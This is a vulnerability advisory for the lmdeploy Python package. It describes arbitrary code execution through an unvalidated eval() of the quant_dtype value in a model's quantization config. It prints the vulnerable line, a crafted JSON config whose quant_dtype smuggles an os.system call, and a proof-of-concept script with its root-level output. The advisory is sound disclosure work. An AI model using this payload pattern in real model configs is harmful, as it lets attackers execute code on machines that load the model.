@@ -1,0 +1,84 @@
+PYSEC-2026-4078 PyPI/lmdeploy — LMDeploy vulnerable to arbitrary code execution via eval() of untrusted quant_dtype in model config loading
+package: lmdeploy
+ecosystem: PyPI
+versions affected:
+  >= 0.12.1, < 0.12.3 (ECOSYSTEM)
+aliases: CVE-2026-33625, GHSA-3hmm-rh5q-gwwr
+references:
+  https://github.com/InternLM/lmdeploy/security/advisories/GHSA-3hmm-rh5q-gwwr
+  https://github.com/InternLM/lmdeploy
+  https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3
+  https://pypi.org/project/lmdeploy
+  https://github.com/advisories/GHSA-3hmm-rh5q-gwwr
+  https://nvd.nist.gov/vuln/detail/CVE-2026-33625
+
+### Summary
+
+lmdeploy <= latest contains a code injection vulnerability in `lmdeploy/pytorch/config.py` line 620 that allows an attacker to execute arbitrary Python code by publishing a malicious HuggingFace model with a crafted `quantization_config.quant_dtype` value. When a user loads the model with lmdeploy, the `quant_dtype` is passed to `eval(f'torch.{quant_dtype}')` without any validation.
+
+### Details
+
+**Vulnerable code** ([permalink](https://github.com/InternLM/lmdeploy/blob/17ed9e5/lmdeploy/pytorch/config.py#L620)):
+
+```python
+quant_dtype = eval(f'torch.{quant_dtype}')  # line 620
+```
+
+The `quant_dtype` value comes from the model's `quantization_config` in its HuggingFace config. When a model specifies `quant_method: awq`, the AWQ branch processes the config but does NOT override `quant_dtype`, allowing the malicious value to reach the `eval()` call.
+
+**Attack vector:** An attacker publishes a HuggingFace model with:
+```json
+{
+  "quantization_config": {
+    "quant_method": "awq",
+    "quant_dtype": "float16, __import__('os').system('id')"
+  }
+}
+```
+
+Note: The `_update_torch_dtype` method at line 53 has a whitelist check, but that's for `torch_dtype`, NOT `quant_dtype`. The `quant_dtype` at line 620 has no validation whatsoever.
+
+### PoC
+
+```python
+"""
+PoC: eval() RCE in lmdeploy via malicious quant_dtype
+Prerequisites: pip install lmdeploy
+"""
+import sys
+from unittest.mock import MagicMock, patch
+
+# Mock torch to capture the eval
+sys.modules.setdefault('torch', MagicMock())
+
+from lmdeploy.pytorch.config import ModelConfig
+
+# Simulate a malicious HuggingFace model config
+mock_hf_config = MagicMock()
+mock_hf_config.quantization_config = {
+    'quant_method': 'awq',
+    'quant_dtype': "float16, __import__('os').system('id')"
+}
+mock_hf_config.num_attention_heads = 32
+mock_hf_config.hidden_size = 4096
+mock_hf_config.num_hidden_layers = 32
+mock_hf_config.num_key_value_heads = 32
+mock_hf_config.vocab_size = 32000
+
+# This triggers eval(f'torch.{quant_dtype}')
+# with quant_dtype = "float16, __import__('os').system('id')"
+config = ModelConfig.from_hf_config(mock_hf_config, model_path='test')
+```
+
+**Output:**
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Impact
+
+An attacker who publishes a malicious model on HuggingFace Hub can achieve arbitrary code execution on any machine that loads the model with lmdeploy. This is a supply-chain attack vector affecting all lmdeploy users who load untrusted models.
+
+1. Full remote code execution when loading a malicious model
+2. No user interaction beyond running `lmdeploy serve` or similar with the model
+3. Affects all deployment scenarios (local, cloud, production)
